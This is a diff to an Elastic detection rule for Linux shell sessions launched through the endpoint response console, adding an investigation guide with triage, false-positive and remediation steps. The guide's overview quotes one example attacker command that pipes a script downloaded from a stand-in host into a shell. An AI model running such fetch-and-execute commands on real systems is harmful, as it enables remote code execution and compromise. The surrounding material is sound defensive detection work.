@@ -2,7 +2,7 @@
 creation_date = "2026/07/02"
 integration = ["endpoint", "sentinel_one_cloud_funnel"]
 maturity = "production"
-updated_date = "2026/07/02"
+updated_date = "2026/07/20"
 
 [rule]
 author = ["Elastic"]
@@ -18,6 +18,38 @@ index = [
 language = "eql"
 license = "Elastic License v2"
 name = "Shell Execution via Elastic Endpoint"
+note = """ ## Triage and analysis
+
+> **Disclaimer**:
+> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.
+
+### Investigating Shell Execution via Elastic Endpoint
+
+This rule catches Linux shell sessions launched through the endpoint response console, which matters because that channel can turn a legitimate remote support feature into attacker-controlled command execution on a compromised host. An intruder who hijacks console access might run `bash -c 'curl -fsSL http://x/p.sh | sh'` to fetch and execute a script, establish persistence, or quietly stage follow-on tooling.
+
+### Possible investigation steps
+
+- Correlate the alert with Elastic Security response-action or audit records to identify who initiated the console session, the exact command issued, the authentication method used, and whether it matches an approved ticket or incident workflow.
+- Reconstruct the shell activity from the process tree, command line, and execution context to determine what the command attempted, whether it ran with elevated privileges, and which follow-on processes it launched.
+- Review immediate post-execution host activity for signs of impact such as outbound connections, downloaded scripts or binaries, new cron or systemd persistence, modified startup files, archive creation, or credential-access tooling.
+- Check surrounding host telemetry and related detections to understand why the console may have been used, including recent malware findings, host isolation or release actions, suspicious logins, and lateral movement indicators near the same time.
+- Scope the initiating user, role, or API key for other response-console actions or unusual administrative behavior across the environment, and if the activity is not authorized, preserve command output and isolate the host while access is revoked.
+
+### False positive analysis
+
+- An authorized analyst may use the Elastic Endpoint response console to run a one-line shell command for triage or remediation on a Linux host; confirm the action matches a documented case or approved response record and that the issuing user and time are expected.
+- During incident validation or recovery, a responder may execute shell commands through Elastic Endpoint to collect system state or verify a remediation step; verify the command is consistent with benign administrative checks and that related notes or alerts show an active investigation on the same endpoint.
+
+### Response and remediation
+
+- Isolate the affected Linux host from the network while keeping responder access, terminate any still-running shell or child processes spawned from the Elastic Endpoint console, and block any observed command-and-control destinations or file-download URLs the session contacted.
+- Revoke the unauthorized operator’s access by disabling the associated Elastic account or API key, expiring active sessions, rotating any credentials exposed on the host, and preserving the console command history, shell output, and copied scripts for incident evidence.
+- Remove attacker footholds by deleting unauthorized cron entries in `/etc/cron*` and user crontabs, rogue systemd units under `/etc/systemd/system` or `/usr/lib/systemd/system`, malicious additions to `~/.bashrc` or `/etc/profile`, altered `authorized_keys`, and any downloaded payloads or helper scripts left in directories such as `/tmp` or `/var/tmp`.
+- Restore the system to a known-good state by reimaging or rebuilding the host from a trusted baseline if the shell modified core binaries, package repositories, startup files, or security tooling, and validate that only approved services, users, and scheduled tasks remain before reconnecting it.
+- Escalate to the incident response team immediately if the shell session ran as root, created new accounts, accessed secrets or SSH keys, disabled defenses, or issued commands against multiple hosts, and expand scoping to other systems touched by the same operator, account, or downloaded tooling.
+- Harden the environment by restricting response-console permissions to a small approved group, enforcing MFA and strong session controls for Elastic administration, alerting on shell launches and persistence paths, and tightening Linux egress and application controls so future console abuse cannot fetch tools or execute arbitrary scripts.
+
+"""
 risk_score = 21
 rule_id = "ef35b103-7fca-4af4-879d-a7e73c918659"
 setup = """## Setup
@@ -55,6 +87,7 @@ tags = [
     "Tactic: Execution",
     "Data Source: Elastic Defend",
     "Data Source: SentinelOne",
+    "Resources: Investigation Guide",
 ]
 timestamp_override = "event.ingested"
 type = "eql"
